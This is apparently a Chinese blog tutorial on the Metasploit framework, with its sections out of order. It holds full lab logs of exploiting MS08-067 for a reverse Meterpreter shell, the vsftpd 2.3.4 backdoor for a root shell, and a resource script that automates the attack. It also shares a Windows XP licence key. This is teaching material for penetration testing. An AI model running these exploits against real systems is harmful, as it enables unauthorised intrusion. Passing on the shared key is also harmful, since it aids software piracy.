<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.0.29:4444 </span><br><span class="line">[*] 10.0.0.28:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.0.0.28</span><br><span class="line">[*] Meterpreter session 1 opened (10.0.0.29:4444 -&gt; 10.0.0.28:1050) at 2021-07-03 02:51:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 960 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;cd ..</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">C:\WINDOWS&gt;cd ..</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">C:\&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is A851-3FA8</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">06/26/2021  08:50 AM                 0 AUTOEXEC.BAT</span><br><span class="line">06/26/2021  08:50 AM                 0 CONFIG.SYS</span><br><span class="line">06/25/2021  05:54 PM    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">06/25/2021  05:56 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">07/02/2021  04:26 AM                 0 testtttt.txt</span><br><span class="line">06/25/2021  05:57 PM    &lt;DIR&gt;          WINDOWS</span><br><span class="line">               3 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)   7,927,054,336 bytes free</span><br></pre></td></tr></table></figure>
<p>这次攻击返回了一个 recerse_tcp 方式的 Meterpreter 攻击载荷会话，此时可以用 <code>session -l</code> 命令查看远程运行的 Meterpreter 情况。<code>session -l -v</code> 查看详细信息。</p>
</li>
</ol>
<h2 id="5-3-攻击-Metasploitable-主机"><a href="#5-3-攻击-Metasploitable-主机" class="headerlink" title="5.3 攻击 Metasploitable 主机"></a>5.3 攻击 Metasploitable 主机</h2><ol>
<li><p>nmap 扫描</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; nmap -sT -A -P0 10.0.0.31</span><br><span class="line">[*] exec: nmap -sT -A -P0 10.0.0.31</span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 03:23 EDT</span><br><span class="line">Nmap scan report for 10.0.0.31</span><br><span class="line">Host is up (0.00079s latency).</span><br><span class="line">Not shown: 977 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.0.0.29</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">23/tcp   open  telnet      Linux telnetd</span><br><span class="line">25/tcp   open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">|_ssl-date: 2021-07-03T07:24:10+00:00; 0s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|_    SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">53/tcp   open  domain      ISC BIND 9.4.2</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.4.2</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2</span><br><span class="line">|_http-title: Metasploitable2 - Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2            111/tcp   rpcbind</span><br><span class="line">|   100000  2            111/udp   rpcbind</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/udp   nfs</span><br><span class="line">|   100005  1,2,3      39985/udp   mountd</span><br><span class="line">|   100005  1,2,3      51340/tcp   mountd</span><br><span class="line">|   100021  1,3,4      43006/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      45003/udp   nlockmgr</span><br><span class="line">|   100024  1          58167/tcp   status</span><br><span class="line">|_  100024  1          59031/udp   status</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">512/tcp  open  exec        netkit-rsh rexecd</span><br><span class="line">513/tcp  open  login       OpenBSD or Solaris rlogind</span><br><span class="line">514/tcp  open  shell?</span><br><span class="line">1099/tcp open  java-rmi    GNU Classpath grmiregistry</span><br><span class="line">1524/tcp open  bindshell   Metasploitable root shell</span><br><span class="line">2049/tcp open  nfs         2-4 (RPC #100003)</span><br><span class="line">2121/tcp open  ftp         ProFTPD 1.3.1</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.0.51a-3ubuntu5</span><br><span class="line">|   Thread ID: 9</span><br><span class="line">|   Capabilities flags: 43564</span><br><span class="line">|   Some Capabilities: SupportsCompression, LongColumnFlag, SwitchToSSLAfterHandshake, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, Support41Auth</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|_  Salt: BI&#x27;&amp;(6wuf&quot;r:i&quot;hgO4W7</span><br><span class="line">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span><br><span class="line">|_ssl-date: 2021-07-03T07:24:10+00:00; 0s from scanner time.</span><br><span class="line">5900/tcp open  vnc         VNC (protocol 3.3)</span><br><span class="line">| vnc-info: </span><br><span class="line">|   Protocol version: 3.3</span><br><span class="line">|   Security types: </span><br><span class="line">|_    VNC Authentication (2)</span><br><span class="line">6000/tcp open  X11         (access denied)</span><br><span class="line">6667/tcp open  irc         UnrealIRCd</span><br><span class="line">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span><br><span class="line">|_ajp-methods: Failed to get a valid response for the OPTION request</span><br><span class="line">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br><span class="line">|_http-title: Apache Tomcat/5.5</span><br><span class="line">Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: metasploitable</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: metasploitable.localdomain</span><br><span class="line">|_  System time: 2021-07-03T03:24:02-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 33.39 seconds</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>OS: Unix (Samba 3.0.20-Debian)</li>
<li>ftp：vsftpd 2.3.4</li>
</ul>
</blockquote>
</li>
<li><p>搜索可用的攻击模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                  Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>使用攻击模块展开攻击</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">[*] No payload configured, defaulting to cmd/unix/interact</span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show payloads</span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                       Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                       ---------------  ----    -----  -----------</span><br><span class="line">   0  payload/cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set PAYLOAD payload/cmd/unix/interact</span><br><span class="line">PAYLOAD =&gt; cmd/unix/interact</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/interact):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOST 10.0.0.31</span><br><span class="line">RHOST =&gt; 10.0.0.31</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 10.0.0.31:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 10.0.0.31:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 10.0.0.31:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[+] 10.0.0.31:21 - UID: uid=0(root) gid=0(root)</span><br><span class="line">[*] Found shell.</span><br><span class="line">[*] Command shell session 1 opened (0.0.0.0:0 -&gt; 10.0.0.31:6200) at 2021-07-03 03:32:54 -0400</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">cd ..</span><br><span class="line">dir</span><br><span class="line">bin    dev   initrd      lost+found  nohup.out  root  sys  var</span><br><span class="line">boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz</span><br><span class="line">cdrom  home  lib         mnt         proc       srv   usr</span><br><span class="line">ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:a0:2d:c5  </span><br><span class="line">          inet addr:10.0.0.31  Bcast:10.0.0.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fea0:2dc5/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:3387 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2394 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:309735 (302.4 KB)  TX bytes:482095 (470.7 KB)</span><br><span class="line">          Base address:0xd020 Memory:f1200000-f1220000 </span><br></pre></td></tr></table></figure>
<p><code>VSFTPD v2.3.4 Backdoor Command Execution</code> 这类的攻击称为命令执行漏洞，攻击代码的可靠性通常接近100%。</p>
</li>
</ol>
<p>例子中使用绑定(blind)的交互式 shell，Metasploit 为我们创建了一个直接到目标系统的连接。</p>
<p>如果攻击防火墙或 NAT 网关后的主机，应当使用反弹式连接攻击载荷。</p>
<h2 id="5-4-全端口攻击载荷：暴力猜解目标开放的端口"><a href="#5-4-全端口攻击载荷：暴力猜解目标开放的端口" class="headerlink" title="5.4 全端口攻击载荷：暴力猜解目标开放的端口"></a>5.4 全端口攻击载荷：暴力猜解目标开放的端口</h2><p>如果攻击的组织内部设置了非常严格的出站端口过滤，很多攻击在防火墙上仅仅开放个别特定的端口，将其他端口一律关闭。</p>
<p>Metasploit 提供了一个专用的攻击载荷帮助我们找到这些放行的端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; search ports</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">    Name                                                                Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -    ----                                                                ---------------  ----       -----  -----------</span><br><span class="line">   0    exploit/windows/misc/allmediaserver_bof                             2012-07-04       normal     No     ALLMediaServer 0.8 Buffer Overflow</span><br><span class="line">   1    auxiliary/scanner/snmp/sbg6580_enum                                                  normal     No     ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module</span><br><span class="line">   ...</span><br><span class="line">   152  payload/windows/meterpreter/reverse_tcp_allports                                     normal     No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; </span><br><span class="line">[*] Started reverse TCP handler on 10.0.0.29:4444 </span><br><span class="line">[*] 10.0.0.28:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.0.0.28</span><br><span class="line">[*] Meterpreter session 3 opened (10.0.0.29:4444 -&gt; 10.0.0.28:1063) at 2021-07-03 04:13:29 -0400</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; sessions -l -v</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Session ID: 1</span><br><span class="line">        Name: </span><br><span class="line">        Type: meterpreter windows</span><br><span class="line">        Info: NT AUTHORITY\SYSTEM @ SEU-A601A799D94</span><br><span class="line">      Tunnel: 10.0.0.29:4444 -&gt; 10.0.0.28:1057 (10.0.0.28)</span><br><span class="line">         Via: exploit/windows/smb/ms08_067_netapi</span><br><span class="line">   Encrypted: Yes (AES-256-CBC)</span><br><span class="line">        UUID: 5b37f459b5f760bb/x86=1/windows=1/2021-07-03T08:01:13Z</span><br><span class="line">     CheckIn: 9s ago @ 2021-07-03 04:17:22 -0400</span><br><span class="line">  Registered: No</span><br><span class="line"></span><br><span class="line">  Session ID: 2</span><br><span class="line">        Name: </span><br><span class="line">        Type: meterpreter windows</span><br><span class="line">        Info: NT AUTHORITY\SYSTEM @ SEU-A601A799D94</span><br><span class="line">      Tunnel: 10.0.0.29:4444 -&gt; 10.0.0.28:1060 (10.0.0.28)</span><br><span class="line">         Via: exploit/windows/smb/ms08_067_netapi</span><br><span class="line">   Encrypted: Yes (AES-256-CBC)</span><br><span class="line">        UUID: dfbe9a4c79f02d80/x86=1/windows=1/2021-07-03T08:01:13Z</span><br><span class="line">     CheckIn: 10s ago @ 2021-07-03 04:17:21 -0400</span><br><span class="line">  Registered: No</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; sessopms -i 2</span><br></pre></td></tr></table></figure>

<h2 id="5-5-资源文件"><a href="#5-5-资源文件" class="headerlink" title="5.5 资源文件"></a>5.5 资源文件</h2><p>资源文件（resource files）是 MSF 终端内包含一系列自动化命令的脚本文件。</p>
<p>文件内容是一个可以在 MSF 终端中执行的命令列表，按列表顺序执行。</p>
<p>实现许多重复性任务的自动化。</p>
<p>使用方式：</p>
<blockquote>
<ol>
<li>在 MSF 终端中使用 resource 命令载入资源文件</li>
<li>msfconsole 启动命令是加入 -r 参数</li>
</ol>
</blockquote>
<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/scripts]</span><br><span class="line">└─$ echo use exploit/windows/smb/ms08_067_netapi &gt; autoexploit.rc</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~/scripts]</span><br><span class="line">└─$ echo set RHOST 10.0.0.28 &gt;&gt; autoexploit.rc                   </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/scripts]</span><br><span class="line">└─$ echo set PAYLOAD payload/windows/meterpreter/reverse_tcp &gt;&gt; autoexploit.rc </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/scripts]</span><br><span class="line">└─$ echo set LHOST 10.0.0.29 &gt;&gt; autoexploit.rc                                </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/scripts]</span><br><span class="line">└─$ echo exploit &gt;&gt; autoexploit.rc            </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/scripts]</span><br><span class="line">└─$ cat autoexploit.rc </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set RHOST 10.0.0.28</span><br><span class="line">set PAYLOAD payload/windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.0.0.29</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/scripts]</span><br><span class="line">└─$ msfconsole -r autoexploit.rc </span><br><span class="line"></span><br><span class="line">msf6 &gt; resource autoexploit.rc</span><br></pre></td></tr></table></figure>

<h1 id="6-Meterpreter"><a href="#6-Meterpreter" class="headerlink" title="6. Meterpreter"></a>6. Meterpreter</h1><p>Meterpreter 是 Metasploit 框架中的一个杀手锏，通常被作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后能够返回给我们一个控制通道。</p>
<p>Meterpreter 是 Metasploit 框架的一个扩展模块，可以调用 Metasploit 的一些功能，对目标系统进行更为深入的渗透。</p>
<h2 id="6-1-攻陷-Windows-XP-虚机"><a href="#6-1-攻陷-Windows-XP-虚机" class="headerlink" title="6.1 攻陷 Windows XP 虚机"></a>6.1 攻陷 Windows XP 虚机</h2><h3 id="6-1-1-使用-nmap-扫描端口"><a href="#6-1-1-使用-nmap-扫描端口" class="headerlink" title="6.1.1 使用 nmap 扫描端口"></a>6.1.1 使用 nmap 扫描端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


<blockquote>
<p>序列号：CM3HY-26VYW-6JRYC-X66GX-JVY2D，仅可用于windowsXP sp3 vol专业版中英文原版ISO (msdn.itellyou.com)。用这个密钥即可安装和自动激活。</p>
</blockquote>
<h1 id="4-控制台命令"><a href="#4-控制台命令" class="headerlink" title="4. 控制台命令"></a>4. 控制台命令</h1><blockquote>
<p>help / ? 可以列出 msf 所有的命令</p>
</blockquote>
<h2 id="3-1-常见命令"><a href="#3-1-常见命令" class="headerlink" title="3.1 常见命令"></a>3.1 常见命令</h2><ul>
<li>banner：显示 banner 信息</li>
<li>color：启动输出信息的颜色变化</li>
<li>connect：网络工具，与 nc 类似。-h 查看使用详细信息</li>
<li>show：查看当前 msf 提供的功能，show all/modules/exploit/payload…</li>
<li>search：查找，通常 show 直接展示时内容会特别多，可以使用 search，使用对应漏洞的关键字查找</li>
<li>use：使用漏洞利用模块<ul>
<li>info：进入模块后，利用 info 可以查看这个模块的信息</li>
<li>show options/payloads/targets/advanced/evasion（逃避）/missing(必须设置的参数)</li>
</ul>
</li>
<li>check：检查漏洞是否存在。（很多模块没有 check 功能）</li>
<li>back：回到 msfconsole 根目录</li>
</ul>
<h2 id="3-2-数据库相关命令"><a href="#3-2-数据库相关命令" class="headerlink" title="3.2 数据库相关命令"></a>3.2 数据库相关命令</h2><blockquote>
<p>具体使用可通过 -h 参数查看 </p>
<ul>
<li>vulns ：漏洞库</li>
<li>hosts ：主机信息库</li>
<li>services ：port、协议信息库</li>
<li>creds ：密码信息库（如:mysql_login）</li>
<li>loot：hash值库 </li>
</ul>
</blockquote>
<ul>
<li><p>db_connect<br><code>db_connetct -h</code>查看具体使用方法</p>
</li>
<li><p>db_export </p>
</li>
<li><p>db_nmap<br>MSF 集成 nmap 的工具，结果会直接存储到 msf 数据库中。使用方式与 nmap 一样。 </p>
